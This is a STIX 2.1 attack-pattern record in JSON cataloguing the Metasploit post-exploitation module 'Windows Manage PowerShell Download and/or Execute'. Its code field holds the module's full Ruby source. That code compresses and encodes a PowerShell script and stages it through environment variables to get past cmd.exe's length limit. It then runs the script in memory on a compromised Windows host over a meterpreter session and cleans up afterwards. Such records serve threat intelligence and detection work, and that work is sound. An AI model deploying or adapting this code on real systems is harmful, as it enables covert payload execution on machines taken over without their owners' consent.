{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3681601f-1b9f-4ede-b1a7-51c9874070f2",
    "created": "2024-08-14T16:33:05.001144Z",
    "modified": "2024-08-14T16:33:05.001147Z",
    "name": "Windows Manage PowerShell Download and/or Execute",
    "description": " This module will download and execute a PowerShell script over a meterpreter session. The user may also enter text substitutions to be made in memory before execution. Setting VERBOSE to true will output both the script prior to execution and the results.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/powershell/exec_powershell.rb",
            "external_id": "exec_powershell.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# Original script comments by nick[at]executionflow.org:\n# Meterpreter script to deliver and execute powershell scripts using\n# a compression/encoding method based on the powershell PoC code\n# from rel1k and winfang98 at DEF CON 18. This script furthers the\n# idea by bypassing Windows' command character lmits, allowing the\n# execution of very large scripts. No files are ever written to disk.\n##\n\nrequire 'zlib' # TODO: check if this can be done with REX\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage PowerShell Download and/or Execute',\n        'Description' => %q{\n          This module will download and execute a PowerShell script over a meterpreter session.\n          The user may also enter text substitutions to be made in memory before execution.\n          Setting VERBOSE to true will output both the script prior to execution and the results.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => [\n          'Nicholas Nam (nick[at]executionflow.org)', # original meterpreter script\n          'RageLtMan <rageltman[at]sempervictus>' # post module\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_sysinfo\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptPath.new('SCRIPT', [true, 'Path to the local PS script', ::File.join(Msf::Config.data_directory, 'post', 'powershell', 'msflag.ps1') ]),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('SUBSTITUTIONS', [false, 'Script subs in gsub format - original,sub;original,sub' ]),\n        OptBool.new('DELETE', [false, 'Delete file after execution', false ]),\n        OptBool.new('DRY_RUN', [false, 'Only show what would be done', false ]),\n        OptInt.new('TIMEOUT', [false, 'Execution timeout', 15]),\n      ]\n    )\n  end\n\n  def run\n    # Make sure we meet the requirements before running the script, note no need to return\n    # unless error\n    return 0 if !(session.type == 'meterpreter' || have_powershell?)\n\n    # End of file marker\n    eof = Rex::Text.rand_text_alpha(8)\n    env_suffix = Rex::Text.rand_text_alpha(8)\n\n    # check/set vars\n    subs = process_subs(datastore['SUBSTITUTIONS'])\n    script_in = read_script(datastore['SCRIPT'])\n    print_status(script_in)\n\n    # Make substitutions in script if needed\n    script_in = make_subs(script_in, subs) unless subs.empty?\n\n    # Get target's computer name\n    computer_name = session.sys.config.sysinfo['Computer']\n\n    # Create unique log directory\n    log_dir = ::File.join(Msf::Config.log_directory, 'scripts', computer_name)\n    ::FileUtils.mkdir_p(log_dir)\n\n    # Define log filename\n    script_ext = ::File.extname(datastore['SCRIPT'])\n    script_base = ::File.basename(datastore['SCRIPT'], script_ext)\n    time_stamp = ::Time.now.strftime('%Y%m%d:%H%M%S')\n    log_file = ::File.join(log_dir, \"#{script_base}-#{time_stamp}.txt\")\n\n    # Compress\n    print_status('Compressing script contents.')\n    compressed_script = compress_script(script_in, eof)\n    if datastore['DRY_RUN']\n      print_good(\"powershell -EncodedCommand #{compressed_script}\")\n      return\n    end\n\n    # If the compressed size is > 8100 bytes, launch stager\n    if (compressed_script.size > 8100)\n      print_error(\"Compressed size: #{compressed_script.size}\")\n      error_msg = 'Compressed size may cause command to exceed '\n      error_msg += \"cmd.exe's 8kB character limit.\"\n      print_error(error_msg)\n      print_status('Launching stager:')\n      script = stage_to_env(compressed_script, env_suffix)\n      print_good('Payload successfully staged.')\n    else\n      print_good(\"Compressed size: #{compressed_script.size}\")\n      script = compressed_script\n    end\n\n    # Execute the powershell script\n    print_status('Executing the script.')\n    cmd_out, running_pids, open_channels = execute_script(script, datastore['TIMEOUT'])\n\n    # Write output to log\n    print_status(\"Logging output to #{log_file}.\")\n    write_to_log(cmd_out, log_file, eof)\n\n    # Clean up\n    print_status('Cleaning up residual objects and processes.')\n    clean_up(datastore['SCRIPT'], eof, running_pids, open_channels, env_suffix)\n\n    # That's it\n    print_good('Finished!')\n  end\nend\n"
}